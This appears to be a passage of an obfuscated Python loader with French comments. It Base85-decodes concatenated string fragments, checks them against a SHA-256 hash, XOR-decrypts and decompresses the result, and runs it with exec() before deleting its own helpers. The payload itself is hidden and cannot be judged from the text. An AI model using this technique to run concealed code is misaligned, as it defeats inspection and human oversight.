_ccczp1sB3gfVWc = ';B%{(><u6nf0~Fd2GVXLoN@P%jny*=lx<o`_5v+YQPvlubp~Y82n)CHgzv7}Eb^(;rk*{Lt'
_crLNDZojwHPSMV = 'lGqdiI>i>8%u64UfergRM{W1W{#RZZcQ8V3e11&w)Cd=(I11toYikgCSR!}O^5`u9}Y?{*z'
_chBSD3AQsuVjbL = 'G2<!w06%*R+$`DSsZ$q%I~If3+ZeH&mnMP!UZ_yyinl0@x!TOmsaZ0tIKq&h+el(n46sE=5'
_cqy1oes_K0TYXl = '%ZLIHYMN`iMv?{n{v2RjJWNv(w*kOFS8iHE<^F>Gn`C)X~XedPhXm(!En1XktFKTnH_g~^O'
_cjQ2XdCs0D0DDB = 'n{pl`UDY$(Z@{V^(SXz&<nQhp?dF|<C8UA#|CXe0K-e$0UD9s=u(%u9'

_plGlaeFqLV9ZFB = __import__('base64').b85decode(_cuBeelSoN3wpMz + _cw1OyAVyK204Fu + _csBQ0JQ1ei6TRC + _cq4J_ToBFz5rdr + _cfwmGJeni7s4Ug + _ckijfq6QAaRY9M + _clZRHXihk1NMss + _ctWdPaWAYG_RYu + _caIP3VBfei2NL9 + _cdTmWkWQ2_LtSH + _cajF3aAm9C4qZM + _cxmbNsZCxPrjlz + _coIyuChYRwspLe + _craZ_aUGgAKwmP + _cfYuF2sfw_pb4k + _ct6xsgXzH2ubSw + _clM1nxRZAOd1gU + _ctTSph8gpISe9K + _ca3Hq1EOti3AB8 + _conEeIU325dzhB + _crJ5tpeNQI3TBM + _cc7P6_DWRlxQ1N + _cuekIOkKNDnSlV + _cayFrftufYa5XM + _cooZZ7jiPrxukI + _ch7NZHr3io1rcI + _ctvkuYofeE5CWW + _crSSHMCaM4tsoY + _cvGhdCohnVQOhV + _cfHQQv6Uju5aJT + _cr4VP_5zOkvmKw + _clRZ4egunAJQiU + _cyzaIZ59EHAR8e + _ccN8HW4PPh2nLo + _cybueXu2mJmcrj + _chaGsyixrduklw + _cpTNqh2ZIkInEE + _czO_Xek1_d7X8d + _cgzHDEAr6fk9L8 + _cf1eMEZcSQ_xTa + _clEbcREUJ7MTtp + _cbBRo8RBC9xBu3 + _caucOMrGzZqser + _canglUOiKBCjlV + _cnjGvVNUTP5FBX + _cqR1ZWVuyPDzWl + _cnq8tNO8wWAmB7 + _cbYBLaNqztFH4n + _cnWwwTahqL98xb + _cfNNZMyIDqfZj8 + _cvpyyxYdWiFOBg + _cmoufjxGOkQ6Jk + _czd07bxoiKMpRm + _csc551Dfi0ime0 + _cmnlcKEBdRyOdA + _cveN0_QcejskvC + _co_Z_iM02J4acs + _clBGlOoCuNy96V + _cy_tr_ASQFDGtF + _ctShgkorBeDYgq + _cfHr0qcXBMJjuZ + _crXjt2u_TTWpI2 + _cgXcq0QbV5en9R + _cjfBeNl5cuWOco + _cc1CFx2DDQJK_x + _cgtZhq4BjTdBcT + _cy5GBS5gDq0K8n + _c_fmcWLzH0CdHS + _cvJX8VSKrjMMMW + _cvtSsW27IzndnN + _cwoLuDQxnpHos9 + _cebIwiHqh5YYN3 + _chSD9J6f69ZLaB + _cpDuw_EauHB4EX + _c_2TvJh0v568uk + _cjsKvAYFT0_pN4 + _crbH3IZL6old_K + _caRObCcZUIssHu + _cpXS7z17V2PBym + _cr6vLk8vFdCCG5 + _cy4n4OBVGzudeJ + _cjfr6znKnj5mw7 + _cjysoEoHeyGoDY + _cuE_LRNGCm9vb3 + _cxMPFbR5EJGhLC + _czQUYYNE4LlxAq + _clkVFwTk6KlbMh + _cdXvEDlltJVCfR + _cxrahpOmpMmSbc + _cvCYkQ9NbaeMJR + _ct2VnsLD2qL51k + _chZN4hpZX7r9Ac + _cvpZrvj6DbLAk8 + _cv0_zikGbBdJAz + _cjMD0uhVzB__UI + _coHajz3KxYjSkn + _cn56zcnR67ulqh + _cfQEXIX65MFIL1 + _cgcY3i_xWGXtDr + _csTji5x8opnrKC + _cdhwgF_McjLIcx + _ccS4MISZI8mVyK + _ctGbXvFWJEP8mC + _ciGNaUz7MAYLoR + _cbTJHWUHHnvSHa + _cxf302Cl6PjISu + _clNI7eVs4Ii6gO + _cnTJRXipaNR4iV + _cpY3Apfv5Dd_Kr + _cifrCY9t7XDPF8 + _cuh1Bph7enX1JH + _cnPbONygy9Iexm + _csDgtTMLCZJDPU + _cdMb5g32mSIs78 + _ck2S8WHfBxRbuF + _cchV21oG2bRrBQ + _cark4XwFVz8qyl + _csSDdO9ZMJ_AEd + _cuA91m94SH2A6l + _clyfsc4SGIlEVj + _crXo4EfNBixtUp + _cecSIFxKCSnj3R + _coDjAuvZD2_5ox + _cynNUBxk1DSNor + _cyfRwFBdjMbGC9 + _ccFChf_Q_7tnjv + _ciupIvHg7yD45K + _crRyRVDeI_2dur + _chg1qkNJBqp4_I + _cktipbQCZ17VWk + _cstsHEH7r1RrtT + _csxzO8QDJZ45Js + _cq6CUeVsrKwLuf + _cfSqHU7ciQZcRl + _czZgZxHk2EA8cV + _cs6hzio_8wJg6M + _cfz_tJvyYWIcit + _casRyzPOx3nDCj + _cl2tAIZ8x7fwV8 + _cmZF9mnOx3fnB8 + _cbBLZCjL8LT7ps + _cuUyOoYW12eyC0 + _ciSFiev2cd0Dpx + _cwAe54WRl7adHc + _cpajp9r_wMtHsx + _c_o8m6OrzHQr8n + _chbzrIuwMjR3BQ + _csxmDHtSZaTQav + _c_oXxyzFTs6p62 + _cqUubXgWrX1DQs + _ce2Roz9WuCm4oS + _cfYspNBC3F6K15 + _czZcjMoLW1soqq + _czJwGGXiOXtqrH + _ccxeck31GRyAkE + _cuJj3nw6pyuTPK + _cst8BUXJndRzrf + _cgBsSZCQzAkJvt + _czfRkEUDosb2Uo + _cfC4hHewYvisjQ + _ccczp1sB3gfVWc + _crLNDZojwHPSMV + _chBSD3AQsuVjbL + _cqy1oes_K0TYXl + _cjQ2XdCs0D0DDB)
if __import__('hashlib').sha256(_plGlaeFqLV9ZFB).hexdigest() != '00e6501abcb70953175c5a24787b757ad2b630abdaa2b281668f77f5b51e7226':
    __import__('sys').exit(1)
_xonZ94TqOVuMj6 = bytes([233, 45, 220, 38, 219, 121, 24, 53, 9, 158, 80, 79, 251, 50, 39, 56, 129, 18, 217, 225])
_fktDeQkKyugTzKF = bytes([66, 50, 120, 149, 146, 15, 32, 147, 211, 107, 206, 37, 114, 202, 198, 142, 250, 109, 234, 96])

def _fxnJeNYQUdM_kt0(_bd6UqiVTlj3AS7, _ksCuawsCNLkfSs):
    return bytes(_bd6UqiVTlj3AS7[_imgjClDDKAXV9T] ^ _ksCuawsCNLkfSs[_imgjClDDKAXV9T % len(_ksCuawsCNLkfSs)] for _imgjClDDKAXV9T in range(len(_bd6UqiVTlj3AS7)))

def _fda6IxJr20kQcid(_thmxIqb4taGnbN):
    import zlib
    return zlib.decompress(_thmxIqb4taGnbN) # Un seul niveau de zlib ici pour simplifier

def _feeCt_aon0RCbEN():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xqjvVkeodAg2jK = _fxnJeNYQUdM_kt0(_plGlaeFqLV9ZFB, _xonZ94TqOVuMj6)
    # 2. Décompression Zlib
    _dwcmGZbm2MSsd5 = _fda6IxJr20kQcid(_xqjvVkeodAg2jK)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dwcmGZbm2MSsd5.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _noPcO4F_cSeAb6 = _main.__dict__
    _noPcO4F_cSeAb6.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _noPcO4F_cSeAb6)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feeCt_aon0RCbEN()
try:
    del _fxnJeNYQUdM_kt0, _fda6IxJr20kQcid, _feeCt_aon0RCbEN
    del _plGlaeFqLV9ZFB, _xonZ94TqOVuMj6, _fktDeQkKyugTzKF
except:
    pass
